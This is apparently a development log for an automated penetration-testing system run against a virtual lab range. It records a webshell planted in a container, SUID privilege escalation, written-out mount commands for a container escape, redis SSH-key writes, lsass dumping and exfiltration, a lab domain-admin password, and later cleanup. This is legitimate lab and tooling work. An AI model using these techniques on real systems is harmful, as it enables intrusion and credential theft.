这一轮给 webshell 驱动加了**第二种模式** `plain`（契约第 10 节）：容器里落的固定 webshell = 「路径本身就是命令 shell」，
命令直接进 `?cmd=<urlencoded>`，客户端用通用的 `runtime/clients/agv_http_cmd.py`（不依赖卡自带客户端）。

### 通道是怎么来的（三跑）

| run | 动作 | 结果 |
| --- | --- | --- |
| `D24-c2-probe` | 复跑 laravel 卡确认容器还活着（`call-20260916T013253-cf285b`） | `uid=33(www-data)`、hostname `8e172820ac78`、cgroup `/docker/8e1728…7288` ⇒ 与 D22-node28 是同一个容器 |
| `D24-c2-drop` / `D24-c2-drop2` | 经 laravel 卡把固定 PHP webshell 写到容器 `/var/www/html/agv.shell.php`（`call-20260916T013326-41250a` / `call-20260916T013523-ce4d75`） | 首版 163B 只抓 stdout；重写为 173B（`popen` 加 `2>&1`）后才看得见 `mount` 的报错——**这个细节直接决定后面能不能定位失败原因** |
| `D24-c2-channel` | `post.channel_echo` 经 plain 通道（`call-20260916T013453-2ac7c0`） | `session_identity=www-data`、`session_host=8e172820ac78` ⇒ 通道成立 |

### 两张卡的结果

- `priv.suid_path_hijack`（节点 26）：`call-20260916T013604-14bf6c-run` —— `suid_binary=/home/jobs/shell`、`uid_after=0`。✅ 转 `implemented`。
- `priv.privileged_container_escape`（节点 22）：**首跑失败**（`D24-c2-escape` / `call-20260916T013504-19a26f`），失败原因不在方法、在**权限上下文**：
  1. 通道每次请求都是 `www-data`，`CapEff=0`（`call-20260916T013537-6d0fb9`：CapPrm/CapEff 全 0、CapBnd=`3fffffffff`）；
  2. 容器里 `/bin/mount` 是 SUID root，但 capabilities 不含 `CAP_SYS_ADMIN` ⇒ `mount: only root can do that`（`call-20260916T013537-2c21b5`）；
  3. `sudo -n -l` 回 `sudo: a password is required`（`call-20260916T013636-8887c5`）⇒ 没有免密 sudo。

### 逃逸链路（root helper 实测，含复原）

| 步骤 | call_id | 回读 |
| --- | --- | --- |
| SUID 劫持拿 root → **同一请求内** `mkdir /hello; mount /dev/sda1 /hello; echo AGVHOSTMARK > /hello/tmp/agv_host_marker` | `call-20260916T013636-8be019` | `SUID-RC=0`、`AGVHOSTMARK` 回读成功 ⇒ **宿主文件系统被读写了** |
| 宿主身份 | `call-20260916T013655-3b2cf1` | `/hello/etc/hostname=ubuntu`、`/hello/home=ubuntu`、`/hello/var/lib/docker` 存在 |
| 复原 | `call-20260916T013656-7d9c16` | `rm marker → umount /hello → rmdir`；`CLEAN-RC=0`、`ls /hello` → No such file |

⇒ 结论：**node 26 → node 22 有顺序依赖**——先提权、再在同一请求里 mount（webshell 没有控制台，两条动作必须写进同一段 shell）。
这个「下一节点要在上一节点的产物/身份上动手」的形态，正是 planner 需要的证据。

### 卡为什么保持 planned

`priv.privileged_container_escape` 的卡面前提是「容器内 root 会话」。实测里它由**组合**达成（SUID 卡 + 逃逸命令写进同一请求），
而当前 `session_ref` 没有「会话已提权 / 以某个身份运行」这样的**权限上下文**字段——把它标成 `implemented`
等于承认「任意 www-data 通道都能直接跑这张卡」，那是假的。所以链路证据留在本节、卡保持 `planned`（缺口见下表）。**时点注记**：该缺口 **D31 已关闭**——`session_ref.min_privilege` 落地、提权供给把 www-data 通道升成 root 通道，卡片随节点 22 实机闭环转 `implemented`（见本文件 D31 节）。

### D24-c2 的清理

- 容器：`/var/www/html/agv.shell.php`、`/tmp/agvroot`、`/hello`（已复原过一次，收尾时再核）
- Kali：`/opt/agv/tools/agv_http_cmd.py` 是通用客户端（部署物，保留，不是残留）

### 靶场清理 D24-d（阶段 A + B 全部完成，2026-09-16）

**阶段 A（Windows 侧 + Kali loot）**
- pc1 `C:\Windows\Temp`：≈40 个 `agv_*.txt` + 3 个 dump 全清（`AGV_COUNT=0`，`agv_lsass.dmp` / `agv_lsass64.dmp` / `agv_lsass_probe.dmp` 的 `Test-Path` 全 False）。
  **坑**：清前/清后的核对必须用 `powershell -nop -EncodedCommand <base64(UTF-16LE)> < nul`——`dir /b C:\Windows\Temp\agv_*` 这类带反斜杠的裸 cmd 会被 OA 通道的 addslashes 破坏（`echo [\a\b]` 回来是 `[\\a\\b]`），核对结果是假的。
- dc：`agv_d.out`（21B）、`agv_diag2.bat`（737B）删除 → LEFT=0；pc2 无残留。
- Kali：`/home/kali/agv-loot/lsass-pc1-card.dmp`（36MB，含凭据材料）+ `/tmp/agv_recv.log` 删除。

**阶段 B（通道收口，2026-09-16 01:57）**
- redis 复原（`call-20260916T014921-046d7c`）：`dir` `/root/.ssh` → `/root`、`dbfilename` `authorized_keys` → `dump.rdb`、`DEL agvtest agv_session_key agvkey` → `DBSIZE=0`。
  原始值确证：`/root/dump.rdb`（596B，Sep 9 21:50 = 靶场部署期）就在 `/root` 下 ⇒ 复原目标就是 `/root`。
- web1 `/root/.ssh/authorized_keys` 删除（`call-20260916T014954-1576d3`）：590B 的文件**整个是 redis RDB**（`REDIS0006` 头），
  三个键（agvtest / agv_session_key / agvkey）全是历次操作留下的 ⇒ 整文件可删，不是原装文件。
- web1 `/tmp/agv-payloads` + `/tmp/agv_recv.log` 删除（`call-20260916T014943-4ad6af`）。
- pc1 `C:/MYOA/attach/im/2609/` 的 **32 个** `*.agv_oa.shell.png` 全删（`call-20260916T014927-68ec31`，LEFT=0）。
- Kali `~/.ssh/agv_session`（+.pub）、`/tmp/agv_laravel_*.py`、`/tmp/agv_pypykatz.err`、`/tmp/agv-payloads` 删除（`call-20260916T015005-283650`）。
- 容器 `/var/www/html/agv.shell.php` 删除（`call-20260916T014922-d2e7e4`）；独立复核：`curl …/agv.shell.php?cmd=id` → **404**（`call-20260916T015020-a09ee1`）。
- **保留项**（判断过，非残留）：Kali `/opt/agv/tools/`（工具部署点，下次要用 push_file.py 重新覆盖）；web1 与 Kali 的
  `known_hosts`（SSH 功能缓存，内容只有 host key 哈希，归属无法确证，保留）。
- 副作用（预期）：`kali -> web1` 的执行器链已失效（第二跳私钥已删）——下次需要 web1 时跑
  `session.ssh_via_redis` 重建（已实现能力，redis 复原后仍可用）。

（维护脚本是一次性的，放 `tmp/d24d_cleanup.py` / `tmp/d24d_phaseb.py` / `tmp/d24d_windows_cleanup.ps1`，不进注册表——见 decisions 的 D24-c2 段。）

## 判定器（checker）落地 · D25（2026-09-16）

从这一轮起，「执行过」与「已验证」分开记账：适配器仍然只解析，**判定由程序做**，模型不能自证成功。

- **模块**：`src/runtime/checker.py`（纯函数 `check()`：三闸 → `pass` / `unsatisfied` / `uncertain` + `value`），
  规则按卡片 `judge.identity_rule` / `judge.effect_rule` 的名字分派；声明了却未实现的规则判 `uncertain` 并写明「卡与判定器漂移」。
- **证据落盘**：`scripts/run_skill_remote.py` 现在把信封写进 `<run_dir>/<call_id>/envelope.json`，`--check` 再写 `judgement.json`。
  此前（D25 之前）的 run 只有 `call.json` / `stdout.txt` / `stderr.txt`，**没有信封**——那些调用只判 `freshness` / `target`，
  其余记 `uncertain` 并在 `notes` 里说明，不假装复判过（`scripts/check_call.py` 会把这句话打出来）。
- **实机两条**：

  | run | 判定调用 | 判定 | 依据 |
  | --- | --- | --- | --- |
  | `D25-checker`（节点 14 `direct_network_access`） | `call-20260916T021135-dd6fa5` | **pass**（`value=true`） | freshness（`call_id` 锚定、命令跑完、卡无 marker）/ target（观测 `target_host=192.168.52.10` 对齐节点 web1 的地址）/ effect（nmap `6379/open/tcp//redis` ⇒ `state==open`） |
  | `D25-checker-neg`（负例，显式 requirement） | `call-20260916T021213-44af65` | **unsatisfied**（`value=false`） | nmap `3389/closed/tcp` ⇒ `state==open` 不成立；CLI 退出码 1 |

- **退出码**：`--check` 时 `run_skill_remote.py` 的退出码 = 判定（这条路径用第二次实机调用 `call-20260916T021633-8c6914` 复核：pass → 退出码 0；负例经 `check_call.py` 复核 → 退出码 1）。
- **复判入口**：`python scripts/check_call.py --call <call 目录> [--node <id> --graph <图> --assets <资产表> --control <控制点>] [--requirement @file] [--json] [--write]`，
  退出码就是判定（`0` / `1` / `2`）。`--node` 走选择器（同一套地址解析）把节点算成 requirement，不另写一套口径。
- **回归**：`tests/test_checker.py` 40 条（三闸四态、规则登记表、`--node` 对齐、折行 marker、信封缺失的诚实口径、CLI 端到端）；
  全量 `python -m pytest -q` → **305 passed, 1 skipped**。
- **坑（本机 PowerShell）**：`--requirement` 传内联 JSON 会被吞掉双引号（`{"a": 1}` 变成 `{a: 1}`）⇒ 用 `@文件` 或裸路径；
  `check_common.py` 两种都支持（`@path` 与 `path`）。

## 节点循环（loop）落地 · D26（2026-09-16）

判定器把「一次调用」变成「一个结论」；这一轮把结论接回节点：`src/runtime/loop.py` 用固定决定表驱动一个
节点的全部候选（重试 → 换卡 → 收尾），执行与判定都从外面注入，CLI 是 `scripts/run_node.py`。

- **决定表**见契约第 13 节；循环零 IO、零模型；`tests/test_loop.py` 24 条逐行覆盖决定表 + 假 runner 端到端
  （换卡到 pass / 超时重试后换卡 / 首个 pass 即停 / `need` 不执行 / 安全阀 aborted）。
- **实机两例**（Kali + Web1 在线，其余四台挂起）：

  | run | 节点 | 结果 | 依据 |
  | --- | --- | --- | --- |
  | `D26-loop-node14` | 14 `direct_network_access` | **succeeded**（退出码 0） | attempt 1 `pre.nmap_tcp_probe` 三闸全过；`node_result.json` + `attempt-1-pre.nmap_tcp_probe/`（inputs + envelope + judgement）落盘；`check_call.py` 复判同判 |
  | `D26-loop-node26-blocked` | 26（容器提权链前置） | **blocked**（`need`，退出码 3） | 卡片缺 `session_ref` ⇒ 循环停在 `need`：`attempts=[]`、`calls=[]`，一条命令都没发 |

- **诚实边界**：换卡路径（unsatisfied / uncertain → `next_method`）由单测覆盖；实机换卡例子需要 pc1 会话通道
  （多候选节点 38/48），留到会话建立后补。`graph_gap` / `no_method` 同理由单测覆盖。

## 运行级路径循环（run）落地 · D27（2026-09-16）

节点循环把「一个节点」跑完，这一轮把整张图接上：`src/runtime/run.py` 用固定决定表决定「下一个该走哪个节点」，
缺的运行现场值交给供给（`supply_runner`），CLI 是 `scripts/run_path.py`。决定表与产物见契约第 14 节；
`tests/test_run.py` 29 条覆盖决定表（含环形 `gaps`）、供给、post 贡献与整图端到端。

### 实机（Kali + Web1 + PC1 三台在线，其余三台挂起）

`node-context`：节点 12 的 `key/value`，节点 7 的 `command=whoami`。

| run | 结果 | 关键证据 |
| --- | --- | --- |
| `D27-path`（首跑） | run **blocked**：14/12/30 **pass**，7 **unsatisfied**，2 `graph_gap`，26/22/41/38/48 `need`，19/28 `need`（缺 command），37/47 `or_unmet` | `node-14/call-…95fb15`、`node-12/call-…6ebd9c`、`node-30/call-…7e24c4` |
| `D27-path2`（修复后复跑） | run **blocked**：14/12/7/30 pass + **19 skip**（effect 6 已证） | `node-7/call-20260916T024954-78cb76-include`（`check_call.py` 复判 **pass**） |

- 首跑 3.2 秒完成整图：`blocked` 类结论零成本（不连 VM、不发命令），真执行的只有 14/12/7/30 四个节点。
- 第二跑里 **`skip_node` 首次在实机生效**：节点 7 成功把 fact 6 放进 inventory，节点 19 的 effect 就是 fact 6
  ⇒ 零成本跳过（OR 兄弟路径不再重复劳动）。
- 决定表轨迹与设计推演完全一致；每个 `need` / `or_unmet` 都带明确原因（写进 `run_result.json` 的
  `needs[]` / `blockers[]`），没有悬空状态。

### 首跑暴露的两个真实缺陷（均已修复 + 回归测试）

1. **OA 卡 effect 规则与证据形状不一致**：`exploit.tongda_oa_include_rce` 的 adapter 用 `between_markers`
   把 marker 包裹块切给 `command_output`（不含 marker），而 `command_output_contains_call_marker` 要求
   marker 在 `command_output` 内（那是 laravel / remote_exec 系的形状）⇒ 命令真跑了却判 `unsatisfied`。
   修复：新增规则 **`wrapped_output_present`**（marker 在 `command_output` 内兼容旧形状；否则要求 raw 里有
   完整 tag 对 `<marker>start`..`<marker>end` 且区间非空；raw 不可读 ⇒ `uncertain`），OA 卡改指新规则。
2. **`call_marker` 从标签段取 token**：`call-20260916T024519-f07418-include` 走 `rsplit("-",1)[-1]` 取到
   标签 `include` ⇒ marker 变 `agvinclude`，与 adapter 上线用的 `agvf07418` 不一致（freshness 用 envelope
   里的值所以过，effect 用派生值所以挂）。修复：① `call_marker` 取 `call-<stamp>-<token>[-<label>]` 的
   **token 段**（不足三段回落旧行为）；② checker 的 `ctx.marker` 优先取 `envelope.markers.call_marker`，
   派生值只作 fallback。

修复后对 D27 首跑的调用做复判：`call-20260916T024519-f07418-include` ⇒ **pass**（无需重跑 VM 即可复验）。

### 已知边界（本轮的诚实清单）

- **credential 供给未实现**：节点 38/48 需要 `credential_ref`，供给链（lsass dump → 外带 → 解析）已在
  D24 手工跑通，但尚未接成自动供给 ⇒ 现在报 `need` 并写明原因。
- **pc1 / web2 会话供给未实现**：`session.ssh_via_redis` 只覆盖「有 redis 服务事实的主机」
  （本轮 web1 场景）；pc1 的 webshell 通道、web2 的容器通道需要注入或后续会话卡。
- **节点 2 的 `graph_gap` 是图缺口**：节点 2 的 `details` 没有 `accounts`，卡片要 `credential_ref`（来自图）
  ⇒ 绑定不上。这是「图需要补事实」的真实记录，不在运行循环里绕过。
  D28 补充：这条边上现在会召回到两张方法卡——原先只有 netexec 版（`planned`，且不匹配 vantage），
  Windows-vantage 的 `evasion.wmi_firewall_off` 被「服务名必须相同」的对象闸误杀掉；
  改为「服务名相同**或端口相同**」后它进入候选（`via: ["case"]`），所以下一次实机会以「WMI 卡缺
  `credential_ref`（图缺口）」的形式报出来，而不是「只有一张没验证过的卡」。
- **`planned` 卡进候选这件事已在 D28 定案**：选择器默认只锁 `implemented` 卡，`planned` / `deprecated` 进
  `excluded[]` 并被点名（节点 22 因此报 `no_method` + 被挡下的卡名，节点 41 从 msf-kiwi（planned）换成
  comsvcs（implemented））；操作员要用未验证方法时显式 `--include-planned`。见下节「术语与契约工程化 · D28」。

## 尚未跑通的（按缺口排序）

| 技能 | 缺什么 | 下一步 |
| --- | --- | --- |
| `evasion.netexec_firewall_off`（节点 2 的备选方法，netexec 版） | ✅ **D41 闭环**：控制点装上 **NetExec 1.5.1**（codeload 源码 + 清华 PyPI 镜像；装法与坑点见卡片 SKILL.md），单卡跑通两轮（判定锚点 `call-20260916T092932-de27e1` / `call-20260916T093251-5a540f`，三闸全过、`firewall_state=disabled`） | 完成——卡已转 implemented；与 `..._wmi` 共享同一验证目标，默认路径锁定不变 |
| `cred.kiwi_lsass_dump`（节点 41，msf kiwi 方法） | 没有 meterpreter 会话（pc1 侧只有 webshell 驱动，只跑单命令） | 保留为**备选方法**（与 comsvcs 那条共享同一验证目标）；等会话建立卡能落地 meterpreter 再验。节点 41 已由 comsvcs 方法链跑通方法层面 |
| `remote_exec.psexec` / `wmiexec.system_probe`（节点 44/48 的另两条方法） | ✅ **D40 已跑通并转 implemented**（`call-20260916T090032-7451ee` → dc / `call-20260916T090036-6c2846` → pc2，三闸全过）；路上修掉 impacket `-p` 歧义与 wmiexec 重定向只覆盖链尾两个真缺陷 | 完成；默认路径仍锁 Windows vantage 的 `wmi_process`（注册表顺序 + 图里的 source 门），这两张是 kali vantage 的备选 |
| 事实 42（节点 41 的前置 leaf）vs 域管凭据 | **两件事必须分开**：①「pc1 的 lsass 里有一条域管登录会话」——不成立（D24-c 的诚实性发现）；②「域管明文凭据可用」——**成立**（D24-e 实测 `Whoami2021` 对 dc/pc2 都有效）。节点 38/48 需要 ②，节点 41 需要 ① | ①是环境前置（除非让靶场出现域管登录）——**D39 更新**：域管交互登录一次后同一条链确实读出 `username Administrator`（见 D39 节）；②已可用，所以 38/48 不再缺凭据，只差 vantage 侧方法（已就位并跑通） |
| `priv.suid_path_hijack`（节点 26） | ✅ D24-c2 已跑通（`uid=0`，见 D24-c2 节） | 完成；它是容器逃逸链路的顺序前置（先提权、再 mount） |
| `priv.privileged_container_escape`（节点 22） | ✅ **D31 闭环**：提权供给（`session.root_via_suid`）把「同一条入口 + `identity=root`」交回会话上下文；逃逸卡在默认路径跑通（`mount` → 宿主侧 marker 写读，三闸 pass） | 完成——卡已转 implemented；「容器内 root 上下文」由供给链表达，没有把 SUID 前置塞进卡里 |
| Kali 侧 `netexec` | ✅ **D41 解决**：D40 复核的「PyPI 无此发行版」仍成立，但 **codeload.github.com 可达** → 源码 tarball + 清华 PyPI 镜像装出 `netexec 1.5.1`（`617a4f6`）；坑点（dunamai 版本依赖 git tag / 4 条 `git+https` 依赖 / aardwolf 要 Rust / `dploot<4` / user 级 `pyOpenSSL>=24` / `/usr/local/bin` 软链）全部留档在卡片 SKILL.md | 完成——SMB 链路完整；rdp/vnc 因跳过 aardwolf 不可用（与本仓库技能无关） |
| 靶场残留（D24-d） | ✅ **阶段 A + B 全部完成（2026-09-16）**：pc1 Temp / dc / pc2 / Kali loot / web1 `authorized_keys` + `/tmp/agv-payloads` / pc1 的 32 个 OA 载荷 / Kali 私钥与 /tmp / 容器 webshell（curl → 404）/ redis 复原（`dir=/root`、`dbfilename=dump.rdb`、`DBSIZE=0`）。保留项（判断过非残留）：Kali `/opt/agv/tools/` 工具部署点、两台机器的 `known_hosts` | 证据见「靶场清理 D24-d」小节（每步带 call_id）；副作用：`kali -> web1` 链已失效，需要时用会话卡重建 |
| **凭据自动供给链**（节点 41/44/48） | ✅ **D40 闭环**：链产出按登录名入账、图上槽位是角色键 —— 现在由运行输入 `account_aliases` **显式登记映射**（`run_context.alias_only.json`，材料仍由链现场产出）；D40-live1 / live2 两跑节点 2/44/48 全 `succeeded`，`kind=bridge` 假设 0 条、`kind=alias` 1 条 | 完成（口径：平台不猜映射，操作者显式声明；见 `run_input_contract.md` §2.4） |
| **web2 容器的会话供给**（节点 26/22） | ✅ **D30 闭环**：供给卡 `session.webshell_via_laravel` 在运行现场把固定 webshell 落进容器并登记为通道（`channels.web2_docker`），节点 26 由 `need` → `succeeded`（三闸 pass） | 完成——供给链已覆盖容器落点（D30 节） |
| **节点 2 的图缺口**（缺 `accounts`） | ✅ **D32-h 闭环**：图侧 `RULE 12` 就地补凭据前提（新 case `disable_firewall_credentialed`，见 rules5_v2 说明的 D32-h 节），节点 2 之后由默认路径跑通；D40 两跑 `evasion.wmi_firewall_off` 三闸 pass | 完成——口径保持「图侧补事实、运行层不绕过」 |

## 术语与契约工程化 · D28（2026-09-16，无实机）

这一批不碰靶场（VM 全部挂起），做的是「同一个东西只有一个名字、一个家」与「缺口要能被程序读出来」。
四条改动与它们的证据：

### 1. 领域词统一到 `skill`（术语表 + 守线测试）

- 新增 [术语表](glossary.md)：每个领域词一个定义 + 一个真源；`ability` / `capabilities`（当技能用时）列为历史词。
- `capability_retrieval_execution_flow.md` → `skill_retrieval_execution_flow.md`（链接同步）；代码提示语
  代码提示语里的旧词 `capability gap` → `skill gap`（旧词出现在本页只为记录更名）。
- `tests/test_terminology.py`：机器面（`src` / `scripts` / `schemas` / `tests` / `skills/**/*.json`）零容忍；
  当前契约页（`docs/product/*.md`、`file_tree.md`）引用旧词必须在同一行标注历史；`docs/` 下文件名不得再用旧词。
- 顺手的归档卫生：`scripts/vnc_console.py.bak_20260911` → `archive/tool_backups/`（备份属于归档区）。

### 2. 机器契约瘦身，叙述归知识层

- 卡片 `notes` 定成 **≤200 字的一行指针**（schema `maxLength` + 校验），长叙述迁进同目录 `SKILL.md` 的「实测记录」；
  `implemented` 卡片必须有 `SKILL.md`。10 张超长卡片按此迁移，内容零丢失（迁移脚本在 `output/diag/D28/`）。
  （D47 更新：`SKILL.md` 已是主工件——攻击实现方法卡八段模板；「实测记录」段即今「实机验证记录」段。）
- `registry.json` 的 `note` 从 814 字压成 4 句文件定位；批次与状态叙述留在本页与 [技能复核快照](skill_matrix.md)。

### 3. 状态变成可执行语义（`planned` 不再当计划）

真图选择基线（`--assets data/inputs/hongri7/assets.json --control 192.168.52.128`，12 个 AND 节点）：

| 节点 | case | 锁定 | 状态 | 被状态挡下 | 绑定情况 |
| --- | --- | --- | --- | --- | --- |
| 2 | disable_firewall | — | — | `evasion.netexec_firewall_off` | WMI 卡缺 `credential_ref`（图缺口） |
| 7 | command_interpreter | `exploit.tongda_oa_include_rce` | implemented | — | 缺 `command`（运行现场） |
| 12 | public_application_initial… | `exploit.redis_unauth_write` | implemented | — | 缺 `key` / `value` |
| 14 | direct_network_access | `pre.nmap_tcp_probe` | implemented | — | 绑定齐 |
| 19 | command_interpreter | `exploit.tongda_oa_include_rce` | implemented | — | 缺 `command` |
| 22 | container_escape | — | — | `priv.privileged_container_escape` | 无可选卡（卡缺口） |
| 26 | path_hijack_root | `priv.suid_path_hijack` | implemented | — | 缺 `session_ref` |
| 28 | public_application_initial… | `exploit.laravel_ignition_rce` | implemented | — | 缺 `command` |
| 30 | direct_network_access | `pre.nmap_tcp_probe` | implemented | — | 绑定齐 |
| 38 | windows_credential_remote_system_after… | `exec.wmic_remote_cmd` | implemented | psexec / wmiexec | 缺 `credential_ref` / `session_ref` |
| 41 | lsass_system | `cred.comsvcs_minidump` | implemented | `cred.kiwi_lsass_dump` | 缺 `session_ref`；parse 缺 `dump_path` |
| 48 | windows_credential_remote_system_firewall_state | `exec.wmic_remote_cmd` | implemented | psexec / wmiexec | 缺 `credential_ref` / `session_ref` |

- 与 D27 的差别只有两处，都是「别把没验证的方法当成计划」：节点 22 从「锁到 planned 卡、报缺会话」变成
  「`no_method` + 点名被挡下的卡」；节点 41 从首选 msf-kiwi（planned）换成 comsvcs（implemented，D24-c 真跑过）。
- 索引新增 `by_status` / `status_counts`（派生视图），让「哪些方法真的验证过」一次读取就够；`--graph --strict` 仍 12/12 覆盖。

### 4. case 召回的对象闸按端点判（修掉一个真缺陷）

- 原规则「技能声明了服务名就必须与节点服务名相同」把节点 2 的 Windows-vantage 卡静默丢掉（节点写 `scm/445`，
  卡走 `smb/445` + `wmi/135`）。新规则：**服务名相同或端口相同**即视为同一端点；跨端点误召回仍被挡
  （同一 `public_application_initial_access` case 下，`redis` 卡不会进 laravel 节点、反之亦然，测试里各有断言）。
- 影响面已逐节点核对：只有节点 2 多出一张候选，其余 11 个节点的召回与排序不变。

### 5. 缺口会说话（run_result 的两个工作清单）

- `graph_gaps[]`（图上缺的事实）/ `skill_gaps[]`（没有可选技能的节点，含被状态挡下的卡）常驻 `run_result.json`；
  节点条目附 `selection`（locked / missing / excluded / notes）。两个清单只陈述缺口，不执行动作。
- 由 `tests/test_run.py` 的端到端用例覆盖（纯逻辑，不需要靶场）。

**校验**：`pytest -q` → **376 passed, 1 skipped**；`build_skill_index.py --check` ok；`--graph --strict` 12/12。
**已知边界**：本批没有实机 run，`graph_gaps` / `skill_gaps` 只有离线证据；下一批（credential 供给链 + 会话供给）
会在实机跑一体化路径时同时验证它们。

## 方法链 = 数据 · D29（2026-09-16）

这一轮把「节点 41 要按 dump → 外带 → 解析三段做」从**操作员记忆**变成**注册表数据**（`chains`），并补上运行循环
该有的三件事：链派发、通道资产化、凭据按账号供给。四次实机 run 的轨迹：

| run | 结果 | 关键证据 |
| --- | --- | --- |
| `D29-full`（首跑） | 5 succeeded / 1 uncertain / 8 blocked | 28 撞 `502`（Web2 没开）；41 `need`：通道探针 target 闸对不上，判定器自己点名 `supply --host-map to settle it` |
| `D29-full2`（补 host-map + 开 Web2） | 5 succeeded / 1 failed / 1 uncertain / 7 blocked | 28 **failed**（缺陷 D：卡的 effect 规则与证据形状不符）；41 `chain_unfolded`（缺陷 C：dump 段 pass 但链取不到产物） |
| `D29-full3`（修证据管道） | 6 succeeded / 1 uncertain / 7 blocked | 28 **pass**；41 链停在 parse（缺陷 E：解析产物没有来源主机） |
| `D29-path`（头条） | **7 succeeded / 7 blocked**，76 秒 | 41 **`chain_done`**；通道自动登记 + 复验；38/48 点名账号 |

### 节点 41 的三段（链 `lsass_minidump`）

| 段 | 角色 | 卡 | 判定调用 | 证据 |
| --- | --- | --- | --- | --- |
| 1 | `dump` | `cred.comsvcs_minidump` | `call-20260916T033905-5f3d49` | `hostname=PC1`、`dump_path=C:\Windows\Temp\agv_lsass.dmp`、`dump_size=36137346`、`dump_magic=MDMP` |
| 2 | `exfil` | `transfer.http_post_file` | `call-20260916T033908-90b84a` | 源端/接收端同为 36137346 字节，sha256 `965e4999…8713c` 双边一致（`transfer_verified=true`） |
| 3 | `parse` | `cred.pypykatz_parse` | `call-20260916T033912-1685f1` | 同一 sha256、`hostname=PC1`、账号 `WHOAMIANONY\PC1$` 与 `WHOAMIANONY\bunny`（4 条材料；`material_kept=true`） |

- **执行位置不是新造的**：节点 7 的成功把 OA include 通道留在信封里，运行循环自动收进 `channels.pc1`；
  节点 41 用它之前先跑 `post.channel_echo` 复验（`call-20260916T033905-73d95b`：`nt authority\system` / `PC1`），
  通过了才在链里用。**「曾经打通过」不等于「现在还通」，这条现在是程序动作。**
- **凭据吸收是诚实的**：链拿回 `bunny` 与 `PC1$`（`run_result.credentials[]` 只记 user / domain / 来源，不记 secret）；
  事实 40（`getAccount(pc1,domain_administrator,…)`）记 `unbacked-effect` + `bridge`——**没有**把 OA 用户 `bunny` 当成域管。
- 其余节点与 D27 同口径：14/12/7/28/30 **pass**、19 `skip`（fact 6 已证）、2 `graph_gap`、22 `no_method`（`priv.privileged_container_escape` 仍是 planned）、
  26 `need`（web2 无通道）、37/47 `or_unmet`、38/48 `need`（点名 `dc/pc2:domain_administrator`，并写明 run 手里只有 `bunny`、`PC1$`）。

### 路上修掉的 5 个真缺陷（都在实机暴露，全部带回归测试）

| # | 现象 | 根因 | 修法 |
| --- | --- | --- | --- |
| A | 41 被自己会造的值堵死 | `parse` 段要 `dump_path`，而它正是链中段的产物 ⇒ 节点报 `need` | `chain_dispatch` 声明 `chain_binds`，运行循环把它从 `pending` 里剔除 |
| B | 38/48 明明要两个域管账号，却报「没有凭据」 | 供给只看**绑定的那一个**账号 | 逐账号核对：`account_gaps[]` + `needs[].why` 写明 `<host>:<account>` 与「the run holds: …」 |
| C | dump 段 pass，链仍取不到产物 | 适配器的观测在 `envelope.evidence`，判定只给结论；离线假 runner 把证据塞进 `judgement`，掩盖了这层 | attempt payload 带 `evidence`；`evidence_of` / `absorb_evidence` / 链结果一律优先读 payload evidence，旧形状只作回落 |
| D | laravel 节点真跑通也判 `unsatisfied` | 卡的 `command_output` 是 between_markers 切片（不含 marker），旧规则却要求 marker 在切片里 | include / exploit 两族统一到 `wrapped_output_present`（内含「只看到 marker 前缀 ⇒ `uncertain`」）；旧规则退场 |
| E | parse 段判 `uncertain`：`target: no target observation at all` | 解析产物没有来源主机，target 闸无法对账 | `dump` 段 fold 带出 `hostname`；`parse` 卡新增可选入参 `host` 并写进证据（没有来源就不造） |

### 靶场清理（`D29-cleanup`，脚本 `output/diag/D29/lab_cleanup.py`）

- pc1：`C:\Windows\Temp\agv_lsass.dmp` 删除；`C:\MYOA\attach\im\2609\*.agv_oa.shell.png`（**6 个**我方载荷）删除 → `LEFT=0`。
  **目录更正**：真实落盘目录是 `C:\MYOA\attach\im\2609\`（`attach` 与站点根 `webroot` 同级），不是 `C:\MYOA\webroot\attach\…`——
  清理脚本两条路径都试过，只有前者命中。
- Kali：`/home/kali/agv-loot/lsass-pc1.dmp`、`/tmp/agv_recv.log` 删除；接收端只收一次（`--once`），段后由链收尸。
- redis 复原为 `dir=/root`、`dbfilename=dump.rdb`，并删掉遗留键 `agv_d29_key` / `agv_d27_key` → **`DBSIZE=0`**。
  教训（已写进 run 模板）：节点 12 的 `--node-context` 必须带 `cleanup: true`，否则每跑一次都在靶场留一个键。
- 跑完四台 VM 全部挂起（`vmrun list` → 0）。

### 回归与索引

- `python -m pytest -q` → **449 passed, 1 skipped**（D28 的 376 → 449：新增链 / 供给 / 运行循环的 73 条）。
- `scripts/build_skill_index.py --check` → 17 skills (13 action / 4 support) @ `7e0b527b7fc1` + `index check: ok`（含新的 `by_chain` 视图）。
- 离线彩排 `smoke_chain_run.py`（假 runner）与实机同形：节点 41 `succeeded / chain_done`。

## 容器会话供给 · D30（2026-09-16）

D29 的遗留头条「web2 容器会话供给卡」在这一轮落地：节点 26 由 `need` 变 `succeeded`（容器内 SUID 提权闭环，
`granted.web2_docker: www_data → root`），节点 41 保持 `chain_done`。三次实机 run 的轨迹：

| run | 结果 | 关键证据 |
| --- | --- | --- |
| `D30-path`（首跑，带 `--include-planned`） | 6 succeeded / 2 uncertain / 6 blocked | 26 **实机提权成功**（`uid=0`）却 `uncertain_stop`（target 闸不认容器短 id）；41 `blocked:need(dump_path)`（逃生门把节点已注册的方法替换掉了） |
| `D30-path2`（修缺陷后重跑，带 `--include-planned`） | **8 succeeded / 1 uncertain / 5 blocked** | 26 三闸 pass；41 `chain_done`；通道 `{pc1, web2_docker}` |
| `D30-path3`（卡转 `implemented` 后的默认路径，无逃生门） | 8 succeeded / 6 blocked | 26 由 implemented 卡供给（默认路径）；22 回到 `no_method` 并点名 `priv.privileged_container_escape (planned)` —— 生产口径 |

### 节点 26：容器会话 → SUID 提权

| 步骤 | 谁 | 证据 |
| --- | --- | --- |
| 会话供给 | `session.webshell_via_laravel`（`supply-26-…/call-20260916T041717-ae90da`） | 固定 PoC 写入 173B webshell → plain 客户端探针回显 `www-data` / 容器短 id `8e172820ac78`；通道登记进 `channels.web2_docker` |
| 提权 | `priv.suid_path_hijack`（`node-26/…/call-20260916T041718-ca873a-run`） | `find` 到 SUID `/home/jobs/shell` → `PATH=/tmp` 劫持 → `uid=0(root)`；target 闸由 `target_aliases=["8e172820ac78"]` 对齐 |

### 节点 41：链照旧，`chain.locked` 记录实锁段

| 段 | 卡 | 证据 |
| --- | --- | --- |
| 1 `dump` | `cred.comsvcs_minidump` | `dump_path=C:\Windows\Temp\agv_lsass.dmp`、36,337,890 B、`MDMP` |
| 2 `exfil` | `transfer.http_post_file` | 双边 36,337,890 B、sha256 `c581d11c…38bf` 一致（`transfer_verified=true`） |
